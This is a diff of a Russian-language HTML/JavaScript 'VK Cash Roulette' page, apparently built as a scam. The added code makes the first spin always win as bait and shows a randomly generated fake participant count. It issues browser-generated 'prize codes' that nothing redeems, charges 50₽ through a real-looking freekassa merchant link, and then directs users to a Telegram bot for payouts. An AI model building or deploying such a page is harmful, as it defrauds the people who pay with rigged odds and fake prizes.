@@ -1,91 +1,160 @@
+
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <title>VK Cash Wheel</title>
+  <meta charset="UTF-8" />
+  <title>VK Cash Roulette</title>
   <style>
     body {
-      background: #111;
-      color: #fff;
-      font-family: Arial, sans-serif;
+      font-family: sans-serif;
+      background: #0e0e0e;
+      color: white;
       text-align: center;
-      margin: 0;
+      padding: 30px;
     }
+
     #wheel {
-      margin-top: 50px;
       width: 300px;
       height: 300px;
-      border-radius: 50%;
       border: 10px solid #fff;
+      border-radius: 50%;
+      margin: 20px auto;
       position: relative;
-      margin-left: auto;
-      margin-right: auto;
+      background: conic-gradient(#2ecc71 0% 20%, #e74c3c 20% 40%, #3498db 40% 60%, #f1c40f 60% 80%, #9b59b6 80% 100%);
+      transition: transform 4s ease-out;
     }
+
     #spin {
-      margin-top: 20px;
-      padding: 15px 30px;
-      background: #28a745;
-      border: none;
-      color: white;
+      padding: 10px 20px;
       font-size: 18px;
+      background: #3498db;
+      color: white;
+      border: none;
       border-radius: 5px;
       cursor: pointer;
+      margin-top: 15px;
     }
-    #codeDisplay {
-      margin-top: 30px;
+
+    #result {
       font-size: 20px;
-      color: #00ff00;
+      margin-top: 20px;
     }
-    #pay {
-      margin-top: 30px;
-      padding: 15px 30px;
-      background: #007bff;
-      border: none;
-      color: white;
-      font-size: 18px;
+
+    .top-bar {
+      font-size: 14px;
+      margin-top: 50px;
+      color: #aaa;
+    }
+
+    .code-block {
+      margin-top: 10px;
+      font-family: monospace;
+      background: #1f1f1f;
+      padding: 10px;
       border-radius: 5px;
+    }
+
+    #payBtn {
+      display: none;
+      margin-top: 15px;
+      background-color: #2ecc71;
+      color: white;
+      padding: 12px 24px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
       cursor: pointer;
+    }
+
+    #firstSpinNotice {
+      font-size: 14px;
+      color: #ccc;
+      margin-top: 10px;
     }
   </style>
 </head>
 <body>
-  <h1>Испытай удачу и выиграй деньги!</h1>
-  <div id="wheel">🎰</div>
+  <h1>🎰 Рулетка VK Cash</h1>
+  <div id="wheel"></div>
   <button id="spin">Крутить колесо</button>
-  <button id="pay" onclick="pay()">Оплатить 50₽</button>
-  <div id="codeDisplay"></div>
+  <div id="result"></div>
+  <div id="firstSpinNotice">* Первая попытка всегда выигрывает</div>
+  <button id="payBtn">Попробовать ещё за 50₽</button>
+
+  <div class="top-bar">
+    <p>📜 <a href="#">Правила участия</a> • <a href="#">FAQ</a> • <a href="#">Политика</a></p>
+    <p>👑 Топ победители обновляются каждые 5 минут</p>
+    <p>🔁 Участников: <span id="playersCount"></span></p>
+  </div>
 
   <script>
-    let hasPaid = false;
+    const wheel = document.getElementById("wheel");
+    const result = document.getElementById("result");
+    const spinBtn = document.getElementById("spin");
+    const payBtn = document.getElementById("payBtn");
+    let hasSpun = false;
+    let lastCode = null;
 
     function generateCode(amount) {
       const timestamp = Date.now();
-      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-      let rand = '';
-      for (let i = 0; i < 4; i++) rand += chars[Math.floor(Math.random() * chars.length)];
-      return `CODE-${amount}-${timestamp}-${rand}`;
+      const random = Math.random().toString(36).substring(2, 6).toUpperCase();
+      return `CODE-${amount}-${timestamp}-${random}`;
     }
 
-    document.getElementById("spin").onclick = () => {
-      if (!hasPaid) {
-        alert("Сначала оплатите 50₽, чтобы крутить колесо.");
+    function spinWheel() {
+      let deg = Math.floor(3600 + Math.random() * 1000);
+      wheel.style.transform = `rotate(${deg}deg)`;
+
+      setTimeout(() => {
+        let win = false;
+        let amount = 0;
+
+        if (!hasSpun) {
+          win = true;
+          amount = 50;
+        } else {
+          const chance = Math.random();
+          if (chance < 0.25) {
+            win = true;
+            amount = [50, 100, 200, 300][Math.floor(Math.random() * 4)];
+          }
+        }
+
+        if (win) {
+          const code = generateCode(amount);
+          lastCode = code;
+          result.innerHTML = `🎉 Поздравляем! Вы выиграли <b>${amount}₽</b><br><div class="code-block">${code}</div>`;
+        } else {
+          result.innerText = "😢 Увы, вы ничего не выиграли";
+        }
+
+        hasSpun = true;
+        spinBtn.style.display = "none";
+        payBtn.style.display = "inline-block";
+      }, 4000);
+    }
+
+    spinBtn.onclick = spinWheel;
+
+    payBtn.onclick = () => {
+      if (!lastCode) {
+        alert("Сначала крути колесо и получи код!");
         return;
       }
+      const url = `https://pay.freekassa.ru?m=F7202575639398546&oa=50&currency=RUB&us_code=${lastCode}`;
+      window.location.href = url;
+    };
 
-      const outcomes = [0, 0, 0, 50, 100, 0, 0, 150];
-      const prize = outcomes[Math.floor(Math.random() * outcomes.length)];
-      if (prize === 0) {
-        document.getElementById("codeDisplay").innerText = "Ты проиграл. Попробуй ещё!";
-      } else {
-        const code = generateCode(prize);
-        document.getElementById("codeDisplay").innerText = `🎉 Ты выиграл ${prize}₽!
-🔐 Твой код: ${code}`;
-      }
+    function updatePlayersCount() {
+      const count = Math.floor(100 + Math.random() * 50);
+      document.getElementById("playersCount").innerText = count;
     }
 
-    function pay() {
-      hasPaid = true;
-      alert("Платеж прошел успешно (эмуляция). Теперь можешь крутить!");
+    setInterval(updatePlayersCount, 15000);
+    updatePlayersCount();
+
+    if (window.location.search.includes("success=1")) {
+      result.innerHTML += "<br><b>✅ Оплата прошла! Теперь отправьте код и сумму в Telegram-бота для получения выплаты.</b>";
     }
   </script>
 </body>
